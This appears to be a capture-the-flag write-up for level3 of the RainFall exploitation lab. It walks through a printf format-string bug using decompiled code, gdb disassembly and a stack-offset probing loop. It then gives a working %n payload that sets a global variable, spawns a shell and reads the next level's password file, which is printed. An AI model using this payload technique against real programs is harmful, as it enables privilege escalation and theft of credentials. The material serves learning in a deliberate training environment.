 global variable oferite

   ```bash
   void v(void)
   
   {
     char local_20c [520];
     
     fgets(local_20c,0x200,stdin);
     printf(local_20c); unsafe, no format string!
     if (m == 0x40) {
       fwrite("Wait what?!\n",1,0xc,stdout);
       system("/bin/sh");
     }
     return;
   }
   ```

the allocated buffer is 520 + 4 = Offset to return address

we want to overide the m with 64 not hijacking EIP

from the gdb we have

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave  
   0x08048526 <+12>:    ret    
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
   0x080484be <+26>:    lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave  
   0x08048519 <+117>:   ret    
End of assembler dump.
(gdb) x/s 0x8049860
0x8049860 <stdin@@GLIBC_2.0>:    ""
(gdb) x/s 0x804988c
0x804988c <m>:   ""
(gdb) 
```

Address of `m` = `0x804988c`

The `fgets()` copies the input to a local buffer of 0x208 bytes.

That buffer is passed directly to `printf()`

```
         |→ we fully control `printf(input)`.
```

So we can Include **addresses** in the input

Use format specifiers like `%<n>$n` to write to those addresses

lets find the right ofset :

```bash
for i in $(seq 1 50); do
    python -c "print('\x8c\x98\x04\x08' + '%${i}\$p')" | ./level3
done
```

making a shell to Find the position of our input on the stack

```bash

level3@RainFall:~$ for i in $(seq 1 50); do
>   python -c "print('\x8c\x98\x04\x08' + '%${i}\$p')" | ./level3
> done
�0x200
�0xb7fd1ac0
�0xb7ff37d0
�0x804988c  <- the on we looking for at position 4 
�0x70243525
�0xa
�0xb7fef305
�0xbffff5b8
�0xb7fde2d4
�0xb7fde334
�0x7
�(nil)
�0xb7fde000
�0xb7fff53c
�0xbffff5b8
�0x40
�0xb80
�(nil)
�0xb7fde714
�0x98
�0xb
�(nil)
�(nil)
�(nil)
�(nil)
�(nil)
�(nil)
�(nil)
�0xb7fe765d
�0xb7e3ebaf
�0x80482bb
�(nil)
�(nil)
�(nil)
�0xb7fe749f
�0xb7fd5000
�0x2
�0x8048268
�0xb7fffc00
�0xb7ffeff4
�0xb7ffeff4
�0xb7e2fc30
�0x1
�0xb7fdcb18
�0xb7fe7cac
�(nil)
�(nil)
�(nil)
�(nil)
�(nil)
```

the payload

```bash
level3@RainFall:~$ python -c "print('\x8c\x98\x04\x08' + '%60c' + '%4\$n')" | ./level3
�                                                           
Wait what?!
```

let hang the program to cat the pass word or something else ;

```bash
level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08' + '%60c' + '%4\$n')"; cat) | ./level3
�                                                           
Wait what?!
ls
ls: cannot open directory .: Permission denied
cd ../level4
cat .pass       
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

the token is


